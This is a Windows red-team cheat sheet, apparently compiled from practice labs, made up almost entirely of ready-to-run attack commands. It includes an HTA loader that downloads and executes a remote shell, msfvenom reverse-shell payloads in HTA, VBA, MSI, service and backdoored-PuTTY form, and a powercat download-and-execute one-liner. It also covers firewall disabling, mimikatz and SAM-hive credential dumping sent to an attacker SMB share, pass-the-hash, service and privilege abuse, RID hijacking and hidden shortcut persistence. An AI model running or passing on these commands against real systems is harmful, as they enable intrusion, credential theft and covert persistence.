# RT-CHEATSHEET
# Windows Red Teaming Related Shit
Weaponization
# Vbs
Sample Payload<br>
Set shell = WScript.CreateObject("Wscript.Shell")<br>
 shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True<br>
 shell.Run("C:\Windows\System32\cmd.exe " & WScript.ScriptFullName),1,True<br>
## Run<br>
  wscript hello.vbs<br>
  wsccript /e:VBScript payload.txt

# Hta
Sample<br>
<html><br>
<body><br>
<script><br>
    // var c= 'cmd.exe'<br>
  var c = "powershell iwr -uri 'http://10.10.14.6/customshell.exe' -Outfile C:\\Windows\\Tasks\\a.exe;C:\\Windows\\Tasks\\a.exe -e cmd.exe"<br>
    new ActiveXObject('WScript.Shell').Run(c);<br>
</script><br>
</body><br>
</html><br>
## Generate Payload
Serve hta with web server (eg. python)<br>

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o xxx.hta<br>
## Metasploit Create And Serve Hta<br>
use exploit/windows/misc/hta_server<br>

## Vbs
Basic Payload<br>
Sub Document_Open()<br>
  EXECUTE<br>
End Sub<br>
<br>
Sub AutoOpen()<br>
  EXECUTE<br>
End Sub<br>
<br>
Sub EXECUTE()<br>
   MsgBox ("Welcome to My Room!")<br>
End Sub<br>
<br>
Sub EXECUTE()<br>
    Dim payload As String<br>
    payload = "calc.exe"<br>
    CreateObject("Wscript.Shell").Run payload,0<br>
End Sub<br>
### Msfvenom<br>
### Note: if using .doc files change WorkbookOpen to Documentopen If using excel, no changes needed<br>
<br>
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.159.15 LPORT=443 -f vba
# Powershell
## With PowerCat

powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c 10.10.10.10 -p 1337 -e cmd"<br>
# Enum
## Powershell
Change Keyboard Layout<br>
powershell -command "Set-WinUserLanguageList -Force 'fi-FI'"<br>
## Check For Antivirus/Windows Defender<br>
wmic /namespace:\\root\securitycenter2 path antivirusproduct<br>
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct<br>
Get-Service WinDefend<br>
Get-MpComputerStatus | select RealTimeProtectionEnabled<br>
Get-MpThreat<br>
## EDR Checker
https://github.com/PwnDexter/SharpEDRChecker<br>

## Check For Firewall
Get-NetFirewallProfile | Format-Table Name, Enabled<br>
## Disable Firewall<br>
Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False<br>
Get-NetFirewallProfile | Format-Table Name, Enabled<br>
## Firewall Rules<br>
Get-NetFirewallRule | select DisplayName, Enabled, Description<br>
Get-NetFirewallRule | findStr "Rule-name"<br>
## Test Connection<br>
Test-NetConnection -ComputerName 127.0.0.1 -Port 80<br>
## EDR Checkers
<a href="https://github.com/PwnDexter/Invoke-EDRChecker" />Invoke-EDRChecker</a> SharpEDRChecker<br>

## Network Enum
netstat -na<br>
arp -a<br>
ipconfig<br>
ipconfig /all<br>
## General
systeminfo<br>
whoami /priv<br>
whoami<br>
whoami /groups<br>
## Smb
net share<br>
## Users
net user <br>
net group<br>
net localgroup<br>
net localgroup administrators<br>
## Updates
wmic qfe get Caption, Description<br>
## Credentials
reg query HKLM /f password /t REG_SZ /s<br>
reg query HKCU /f password /t REG_SZ /s<br>
cat C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt<br>
Get-AdUser -Filter * -Properties * | Select Name, Description<br>
## Credentials Mimikatz
sekurlsa::logonpasswords<br>
If We Get 0x00005 Error Then:<br>
!processprotect /process:lsass.exe /remove<br>
!+<br>
sekurlsa::logonpasswords<br>
# Active Directory
## Basic
## Note: use run-tool to check MMC if rdp is available

systeminfo | findstr Domain<br>
Get-ADUser -Filter *<br>
Get-ADUser -Filter * -SearchBase "CN=Users,DC=domain,DC=COM"<br>
Get-ADUser -Filter * -SearchBase "OU=DOM,DC=domain,DC=COM"<br>
Get-ADUser -Identity username -Server domain.local -Properties * <br>
Get-ADUser -Filter 'Name -like "*stevens"' -Server domain.local | Format-Table Name,SamAccountName -A<br>
Get-ADGroup -Identity Administrators -Server domain.local<br>
Get-ADGroupMember -Identity Administrators -Server sa.domain.local<br>
$ChangeDate = New-Object DateTime(2022, 02, 28, 12, 00, 00)<br>
Get-ADObject -Filter 'whenChanged -gt $ChangeDate' -includeDeletedObjects -Server sa.domain.local<br>
Get-ADObject -Filter 'badPwdCount -gt 0' -Server sa.domain.local<br>
Get-ADDomain -Server sa.domain.local<br>

## Change password of user 
Set-ADAccountPassword -Identity gordon.stevens -Server za.tryhackme.com -OldPassword (ConvertTo-SecureString -AsPlaintext "old" -force) -NewPassword (ConvertTo-SecureString -AsPlainText "new" -Force)<br>

dir \\sa.domain.local\SYSVOL\ (check for password files, certificates and other excel files) <br>
net user /domain<br>
net user zoe.marshall /domain<br>
net group /domain<br>
net group "Tier 1 Admins" /domain<br>
net accounts /domain<br>

## Event Log / Sysmon
Get-EventLog -List<br>
Get-Process | Where-Object { $_.ProcessName -eq "Sysmon" }<br>
Get-Service | where-object {$_.DisplayName -like "*sysm*"}<br>
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational<br>
findstr /si '<ProcessCreate onmatch="exclude">' C:\tools\*<br>
## Applications / Services
wmic product get name,version<br>
Get-ChildItem -Hidden -Path C:\Users\xxx\Desktop\<br>
net start<br>
wmic service where "name like 'THM Service'" get Name,PathName<br>
Get-Process -Name "name-service"<br>
netstat -noa |findstr "LISTENING" |findstr "PID"<br>
## Dns Zone Transfer
nslookup<br>
--> server 10.10.0.10<br>
--> ls -d domain.local<br>
<br>
# Priv Esc
### Good automation scripts (these can be noisy)<br>

https://github.com/bitsadmin/wesng<br>
https://github.com/itm4n/PrivescCheck<br>
https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS<br>
multi/recon/localexploitsuggester (metasploit)<br>
## Files To Check<br>
C:\Unattend.xml<br>
C:\Windows\Panther\Unattend.xml<br>
C:\Windows\Panther\Unattend\Unattend.xml<br>
C:\Windows\system32\sysprep.inf<br>
C:\Windows\system32\sysprep\sysprep.xml<br>
C:\ProgramData\McAfee\Agent\DB\ma.db<br>
%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt<br>
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config<br><br>
## Saved Credentials
cmdkey /list<br>
runas /savecred /user:admin cmd.exe<br>
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s<br>
## Quick Wins (Ctf Style)
### Check for tasks and see if we can write on any of of their location

##List of tasks
schtasks<br>
##Info about specific task (eg. pathname)
schtasks /query /tn vulntask /fo list /v <br>
##Check write access
icacls c:\tasks\schtask.bat<br>
##try to run task
schtasks /run /tn vulntask<br>
## Check AlwaysInstallElevated<br>
## IF both of these are set good to go<br>

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer<br>
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer<br>
## Generate payload:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.13.22 LPORT=LOCAL_PORT -f msi -o malicious.msi<br>
## Execute
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi<br>

# Services
### If we can write to any location where service-executables are located, overwrite them and get a shell/session<br>
### Also, check for quotes on BINARYPATHNAME - property, if there are no quotes but spaces we can abuse this since space is argument separator

#### EG

BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe<br>
Can be intercepted as<br>

C:\MyPrograms\Disk arg1 arg2<br>
and so on<br>

Also, test accesschk if we can edit the service itself (check for SERVICEALLACCESS)<br>

## See Config
sc qc apphostsvc<br>
## Edit Config (Might Not Have Rights)<br>
sc config THMService binPath= "C:\Users\thm-unpriv\Desktop\rev-svc.exe" obj= LocalSystem<br>
## Registry
On registry editor goto:<br><br>

HKLM\SYSTEM\CurrentControlSet\Services\<br>
Imagepath = Path to run ObjectName = runner<br>

## Check For Permissions
icacls C:\PROGRA~2\SYSTEM~1\WService.exe<br>
## Generate Service Payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4445 -f exe-service -o rev-svc.exe<br>
## Overwrite Service With Our Payload
cp C:\Users\thm-unpriv\Desktop\rev-svc.exe WService.exe<br>
Give Permissions To Our New Payload<br>
icacls WService.exe /grant Everyone:F<br>
Restart Our Service If We Can<br>
##On cmd.exe<br>
sc stop windowsscheduler<br>
sc start windowsscheduler<br>

# Privilege Abusing
## Check with

whoami /priv<br>
## SeBackup / SeRestore
First Cp Hive Files:<br>
reg save hklm\system C:\Users\sysbackup\system.hive<br>
reg save hklm\sam C:\Users\sysbackup\sam.hive<br>
Send Them To Attacker Host (Eg Smb)<br>
copy C:\Users\sysbackup\sam.hive \\10.11.23.111\public\<br>
copy C:\Users\sysbackup\system.hive \\10.11.23.111\public\<br>
Use Impacket's Secretsdump To Dump Hashes<br>
secretsdump.py  -sam sam.hive -system system.hive LOCAL<br>
Use Hashes (Eg. Psexec From Impacket)<br>
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 administrator@10.10.121.162<br>

## SeTakeOwnership
### Abuse Utilman.exe
### Take Control
takeown /f C:\Windows\System32\Utilman.exe<br>
### Give Privilege To Yourself
icacls C:\Windows\System32\Utilman.exe /grant UserTakeOwnership:F<br>
Rewrite Utilman<br>
copy cmd.exe utilman.exe<br>
#### After these steps lock your computer and press Ease of access button!<br>

## SeImpersonate
There are many exploits for this, try using JuicyPotato or RoguePotato, PrintSpoofer, JuicyPotatoNG<br>

# Unpatched Software<br>
## Check Installed Products<br>
wmic product get name,version,vendor<br>
Find for CVE:s online<br>

# Pivoting
### Running Commands As Another User
## PSExec<br>
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe<br>

## WinRS<br>
### When WinRM is enabled Ports: 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)<br>
winrs.exe -u:Administrator -p:Mypass123 -r:target cmd<br>

## SMBCLIENT
smbclient -c 'put myinstaller.msi' -U username -W ZA '//server.sa.domain.local/admin$/' password<br>
 putting file myinstaller.msi as \myinstaller.msi<br>
 
 ## PowerShell
$username = 'Administrator';<br>
$password = 'Mypass123';<br>
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; <br>
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;<br>
Enter-PSSession -Computername TARGET -Credential $credential<br>
or<br>
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}<br>

## WMI
$Opt = New-CimSessionOption -Protocol DCOM<br>
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop<br>
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";<br>
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command}<br>
### WMI (LEGACY)<br>
wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe" <br>

## Sc
### Ports: 135/TCP, 49152-65535/TCP (DCE/RPC) 445/TCP (RPC over SMB Named Pipes) 139/TCP (RPC over SMB Named Pipes)
#### Administrator required
### Note: sc doesn't work with SSH, spawn another shell (eg netcat) before using this
Start:<br>
sc.exe \\TARGET create servicename binPath= "net user munra Pass123 /add" start= auto<br>
sc.exe \\TARGET start servicename<br>
Shut Down:<br>
sc.exe \\TARGET stop servicename<br>
sc.exe \\TARGET delete servicename<br>

## Scheduled Tasks
### Same restrictions as sc
#### To Start:
schtasks /s TARGET /RU "SYSTEM" /create /tn "task1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 <br>

schtasks /s TARGET /run /TN "task1" <br>
## To Shutdown
schtasks /S TARGET /TN "THMtask1" /DELETE /F<br>

# Persistence
## Also Check Out:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Persistence.md

## Add User To Admin Group
net localgroup administrators thmuser0 /add<br>
## Add To Backup Operators Group
### Note: Backup operators can read any file on machine which essentially means admin access, also adding to Remote Management Users group so we can RDP and WinRM. Also, UAC makes some restrictions when logging in remotely so update a register key<br>
### Setup
net localgroup "Backup Operators" user1 /add<br>
net localgroup "Remote Management Users" user1 /add<br>
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1<br>
After Login (Using Evil-WinRM )<br>
Get Sam & System Files<br>
reg save hklm\system system.bak<br>
reg save hklm\sam sam.bak<br>
download system.bak<br>
download sam.bak<br>
### Dump Hashes
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL<br>
# Special Privileges
#### We basically add SeBackupPrivilege and SeRestorePrivilege to our account<br>

## Export Current Config For Editing<br>
secedit /export /cfg config.inf<br>
notepad config.inf<br>
## Add Our Username To SeBackupPrivilege And SeRestorePrivilege Lines
### Note: using username is fine

## Import Our New Config
secedit /import /cfg config.inf /db config.sdb<br>
secedit /configure /db config.sdb /cfg config.inf<br>

## Modify WinRM Service So We Can Login Via WinRm
### Add our user and give it full control via UI.
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI<br>

# RID Hijacking
We basically update registry values in a way that system thinks we are administrator<br>

## Find RID For Our User
Note: RID is last number set after last - of the SID<br>
wmic useraccount get name,sid<br>
## Edit Our Registry Value
Note: PsExec64 needed<br>
Open Registry Editor<br>
PsExec64.exe -i -s regedit<br>
Navigate To Correct Folder<br>
<b>Note: RID here is hex-presentation of our previously found RID<br></b>
HKLM\SAM\SAM\Domains\Account\Users\RID<br>
Edit F Value<br>
Find RID value from registry and change it to F4 01 (500 in decimal)<br>


# Backdoors Via Files
## Replace Commonly Used Program (Eg. Putty.Exe) With Tampered Version:
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe<br>
Edit Shortcut To Execute Mal Program<br>
Create A Small Script To Execute Wanted Program With Our Backdoor<br>
Store in Windows/System32/backdoor.ps1 for example<br>

Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe IP 4445"<br>

C:\Windows\System32\calc.exe<br>
### Edit Shortcut Target
### Note: you may need to update the icon after this to be more sneaky.

powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1<br>





